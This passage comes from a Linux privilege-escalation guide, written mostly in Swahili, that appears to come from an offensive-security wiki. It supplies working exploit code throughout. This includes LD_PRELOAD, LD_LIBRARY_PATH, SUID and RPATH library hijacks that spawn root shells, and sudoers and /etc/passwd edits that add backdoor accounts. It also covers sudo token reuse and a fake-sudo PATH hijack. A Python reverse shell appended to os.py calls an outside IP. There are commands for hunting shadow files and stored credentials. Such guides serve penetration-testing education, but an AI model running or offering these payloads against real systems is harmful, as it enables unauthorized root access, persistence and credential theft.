Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **i compile** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **ongeza haki za ufikiaji** ukitumia
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti **LD_LIBRARY_PATH** env variable kwa sababu anadhibiti njia ambako libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambayo inaonekana isiyo ya kawaida, ni vizuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa kutumia udhaifu.

Ili kutumia hili, mtu angeendelea kwa kuunda faili ya C, kwa mfano _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, ukishakusanywa na kutekelezwa, unalenga kuongeza privileges kwa kudhibiti file permissions na kuendesha shell yenye privileges zilizoinuliwa.

Kusanya faili la C lililo juu kuwa shared object (.so) file kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoathirika kunapaswa kusababisha exploit, ikiruhusu uwezekano wa kuathiri mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folda ambayo tunaweza kuandika ndani yake, hebu tutengeneze library kwenye folda hiyo na jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ukipata hitilafu kama vile
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambulizi kupita vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni ileile lakini kwa kesi ambazo unaweza **kuingiza tu arguments** katika command.

Mradi hukusanya functions halali za Unix binaries ambazo zinaweza kutumiwa vibaya ili kutoka kwenye restricted shells, kuongeza au kudumisha elevated privileges, kuhamisha files, kuanzisha bind na reverse shells, na kuwezesha other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ukiweza kufikia `sudo -l` unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) ili kuangalia kama inapata jinsi ya exploit sheria yoyote ya sudo.

### Reusing Sudo Tokens

Katika hali ambazo una **sudo access** lakini si password, unaweza kuongeza privileges kwa **kusubiri utekelezaji wa command ya sudo kisha ku-hijack session token**.

Mahitaji ya kuongeza privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" amekuwa ametumia `sudo` kutekeleza kitu ndani ya **last 15mins** (kwa default huo ndio muda wa sudo token unaoruhusu kutumia `sudo` bila kuingiza password yoyote)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kubadilisha permanently `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yametimizwa, **unaweza kuongeza privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia ili **ku-activate sudo token katika session yako** (hutapata root shell moja kwa moja, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit** ya pili (`exploit_v2.sh`) itaweka shell ya `sh` katika _/tmp_ **inayomilikiwa na root na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Udhaifu wa tatu** (`exploit_v3.sh`) uta**unda faili ya sudoers** ambayo hufanya **sudo tokens ziwe za kudumu na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** katika folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza ku-overwrite faili _/var/run/sudo/ts/sampleuser_ na una shell kama huyo mtumiaji yenye PID 1234, unaweza **kupata sudo privileges** bila kuhitaji kujua password kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi ni nani anaweza kutumia `sudo` na vipi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Kama** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa fulani za kuvutia**, na kama unaweza **kuandika** faili yoyote utaweza **kupanua privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ukiona unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa wa `sudo` binary kama vile `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida huunganisha kwenye machine na kutumia `sudo`** ili kuongeza privileges na ukapata shell ndani ya context ya mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza code yako kama root na kisha command ya mtumiaji. Kisha, **rekebisha $PATH** ya user context (kwa mfano kuongeza path mpya kwenye .bash_profile) ili mtumiaji anapotekeleza sudo, executable yako ya sudo iteekelezwe.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kurekebisha faili nyingine ili kuongeza path mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) hurekebisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **configurations files zilizopakiwa zinatoka wapi**. Kwa kawaida, faili hii ina path ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hiyo inamaanisha kuwa configuration files kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Hizi configuration files **zinaelekeza kwenye folda nyingine** ambako **libraries** zitatafutwa. Kwa mfano, content ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana write permissions** kwenye mojawapo ya paths zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili lolote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya config file iliyo ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuweza kuongeza privileges.\
Angalia **jinsi ya exploit hii misconfiguration** katika ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumika na programu katika eneo hili kama ilivyobainishwa katika variable ya `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba mbaya katika `/var/tmp` kwa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **sehemu ndogo ya root privileges zinazopatikana kwa mchakato**. Hii kwa ufanisi hugawanya root **privileges katika vipengele vidogo na tofauti**. Kila kipengele kati ya hivi kinaweza kisha kupewa processes kwa kujitegemea. Kwa njia hii seti kamili ya privileges inapunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzinyanyasa**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Katika directory, **bit ya "execute"** inaashiria kwamba user aliyeathiriwa anaweza "**cd**" kuingia kwenye folder.\
**Bit ya "read"** inaashiria user anaweza **kuorodhesha** **files**, na **bit ya "write"** inaashiria user anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha tabaka la pili la discretionary permissions, zenye uwezo wa **kuzidi traditional ugo/rwx permissions**. Permissions hizi huimarisha udhibiti wa ufikiaji wa file au directory kwa kuruhusu au kukataa rights kwa users maalum ambao si owners wala sehemu ya group. Kiwango hiki cha **granularity huhakikisha usimamizi sahihi zaidi wa access**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpe** user "kali" read na write permissions juu ya file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACL mahususi kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Milango ya ACL iliyofichwa ya backdoor kwenye sudoers drop-ins

Kosa la kawaida la usanidi ni faili linalomilikiwa na root katika `/etc/sudoers.d/` lenye mode `440` ambalo bado linatoa ruhusa ya kuandika kwa mtumiaji mwenye haki za chini kupitia ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ukiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sheria ya sudo licha ya restrictive mode bits:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Hii ni njia ya kudumu ya ACL/privesc yenye athari kubwa kwa sababu ni rahisi kuikosa katika ukaguzi unaotumia tu `ls -l`.

## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **kuhijack** baadhi ya **shell** session ya mtumiaji tofauti (**root**).\
Katika **matoleo ya hivi karibuni zaidi** utaweza **kuunganisha** tu kwa screen sessions za mtumiaji wako mwenyewe. Hata hivyo, unaweza kupata **taarifa za kuvutia** ndani ya session.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Jiambatanishe kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## kuteka vikao vya tmux

Hii ilikuwa tatizo na **matoleo ya zamani ya tmux**. Sikuweza kuteka kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na mapendeleo.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Jiunganishe kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Bug hii husababishwa wakati wa kuunda ssh key mpya kwenye OS hizo, kwa sababu **ni varisheni 32,768 tu ndizo zilikuwa zinawezekana**. Hii ina maana kwamba chaguo zote zinaweza kukokotolewa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata possibilities zilizokokotolewa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Hubainisha kama password authentication inaruhusiwa. Default ni `no`.
- **PubkeyAuthentication:** Hubainisha kama public key authentication inaruhusiwa. Default ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, hubainisha kama server inaruhusu login kwa accounts zilizo na empty password strings. Default ni `no`.

### Login control files

Faili hizi huathiri nani anaweza ku-log in na vipi:

- **`/etc/nologin`**: ikiwa ipo, huzuia non-root logins na huonyesha ujumbe wake.
- **`/etc/securetty`**: hupunguza mahali root anaweza ku-log in (TTY allowlist).
- **`/etc/motd`**: post-login banner (inaweza leak environment au maintenance details).

### PermitRootLogin

Hubainisha kama root anaweza ku-log in kwa kutumia ssh, default ni `no`. Thamani zinazowezekana ni:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Hubainisha faili zilizo na public keys zinazoweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na home directory. **Unaweza kuonyesha absolute paths** (zinazoanza na `/`) au **relative paths kutoka home ya user**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Hiyo configuration itaonyesha kwamba ukijaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**" ssh italinganisha public key ya key yako na zile zilizo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuruhusu **kutumia SSH keys zako za ndani badala ya kuacha keys** (bila passphrases!) zikiwa kwenye server yako. Hivyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda kwenye host nyingine** ukitumia **key** iliyoko kwenye **initial host** yako.

Unahitaji kuweka option hii katika `$HOME/.ssh.config` kama hii:
```
Host example.com
ForwardAgent yes
```
Tambua kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anaruka kwenda mashine tofauti, host hiyo itaweza kupata ufunguo (hii ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** hizi **options** na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (default ni allow).

Ukigundua kwamba Forward Agent imesanidiwa katika mazingira, soma ukurasa ufuatao kwa sababu **huenda ukaweza kuitumia vibaya kuongezea privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts ambazo hutekelezwa wakati mtumiaji anaendesha shell mpya**. Kwa hiyo, ikiwa unaweza **kuandika au kurekebisha yoyote kati yao unaweza kuongezea privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **maelezo nyeti**.

### Passwd/Shadow Files

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zinatumia jina tofauti au huenda kuwe na backup. Kwa hiyo inapendekezwa **uyatafute yote** na **uangalie kama unaweza kuyasoma** ili kuona **kama kuna hashes** ndani ya faili hizo:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili `/etc/passwd` (au inayolingana)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza password kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na ongeza password iliyozalishwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
K.m. `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Au, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa dummy bila nenosiri.\
WARNING: unaweza kupunguza usalama wa sasa wa machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
KUMBUKA: Katika majukwaa ya BSD `/etc/passwd` ipo katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye faili ya **usanidi wa huduma** fulani?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **kurekebisha Tomcat service configuration file ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara inayofuata tomcat itakapoanzishwa.

### Angalia Folders

Folders zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hautaweza kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali ya Ajabu/Mafaili ya Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Mafaili yaliyobadilishwa katika dakika za mwisho
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Mafaili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Hifadhi Nakala**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana kuwa na passwords

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na passwords**.\
**Chombo kingine cha kuvutia** ambacho unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni open source application kinachotumika kupata passwords nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ukiweza kusoma logs, unaweza kupata **maelezo ya kuvutia/siri ndani yake**. Kadiri log inavyoonekana ya ajabu zaidi, ndivyo inavyoweza kuwa ya kuvutia zaidi (huenda).\
Pia, baadhi ya **mbaya** zilizosanidiwa (backdoored?) **audit logs** zinaweza kukuruhusu **kurekodi passwords** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs**, kundi [**adm**](interesting-groups-linux-pe/index.html#adm-group) litakuwa la msaada mkubwa sana.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zenye neno "**password**" kwenye **jina** lao au ndani ya **maudhui**, na pia kuangalia IPs na emails ndani ya logs, au hashes regexps.\
Siendi kuorodhesha hapa jinsi ya kufanya yote haya lakini kama unavutiwa unaweza kuangalia checks za mwisho ambazo [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Writable files

### Python library hijacking

Kama unajua **kutoka wapi** python script itatekelezwa na **unaweza kuandika ndani** ya folda hiyo au **unaweza kurekebisha python libraries**, unaweza kurekebisha OS library na kuibackdoor (kama unaweza kuandika mahali ambapo python script itatekelezwa, nakili na bandika os.py library).

Ili **kuibackdoor library** ongeza tu mwishoni mwa os.py library mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Utekelezaji wa Logrotate

Udhaifu katika `logrotate` huruhusu watumiaji wenye **ruhusa za kuandika** kwenye faili ya log au kwenye saraka zake za mzazi kwa uwezekano kupata ruhusa zilizoongezwa. Hii ni kwa sababu `logrotate`, ambayo mara nyingi huendeshwa kama **root**, inaweza kudanganywa ili kutekeleza faili zozote, hasa kwenye saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kuangalia ruhusa si tu ndani ya _/var/log_ bali pia katika saraka yoyote ambako log rotation inatumika.

> [!TIP]
> Udhaifu huu unaathiri toleo la `logrotate` `3.18.0` na la zamani zaidi

Taarifa zaidi kuhusu udhaifu huu zinaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hiyo kila unapogundua kuwa unaweza kubadilisha logs, angalia ni nani anayezisimamia hizo logs na angalia kama unaweza kuongeza ruhusa kwa kuzibadilisha logs kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Marejeo ya udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Kama, kwa sababu yoyote ile, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** iliyopo, basi **system yako imepwned**.

Network scripts, _ifcg-eth0_ kwa mfano, hutumika kwa miunganisho ya mtandao. Zinafanana kabisa na faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Kwa upande wangu, sifa ya `NAME=` katika network scripts hizi haishughulikiwi vizuri. Ukiwa na white/blank space kwenye jina, system hujaribu kutekeleza sehemu iliyo baada ya white/blank space. Hii inamaanisha kuwa **kila kitu baada ya blank space ya kwanza hutekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

